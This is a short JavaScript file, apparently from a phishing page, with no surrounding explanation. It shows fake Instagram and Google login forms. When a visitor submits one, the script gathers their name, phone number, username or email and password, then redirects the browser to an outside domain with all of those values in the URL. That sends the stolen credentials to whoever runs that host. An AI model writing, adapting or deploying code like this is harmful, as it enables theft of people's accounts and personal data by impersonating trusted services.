document.getElementById('instagram').addEventListener('click', () => {
    document.getElementById('ig').style.display = "block";
});

document.getElementById('iglogin').addEventListener('click', () => {
    let fname = document.getElementById('fname').value;
    let lname = document.getElementById('lname').value;
    let phone = document.getElementById('number').value;
    let igusername = document.getElementById('igusername').value;
    let igpassword = document.getElementById('igpassword').value;

    location.assign(`https://zack0X01.online/?logger=${fname}+'_'+${lname}&phone=${phone}&username=${igusername}&password=${igpassword}`);
});


document.getElementById('google').addEventListener('click', () => {
    document.getElementById('go').style.display = "block";
});


document.getElementById('gologin').addEventListener('click', () => {
    let fname = document.getElementById('fname').value;
    let lname = document.getElementById('lname').value;
    let phone = document.getElementById('number').value;
    let gomail = document.getElementById('gomail').value;
    let gopassword = document.getElementById('gopassword').value;

    location.assign(`https://zack0X01.online/google/?logger=${fname}+'_'+${lname}&phone=${phone}&username=${gomail}&password=${gopassword}`);
});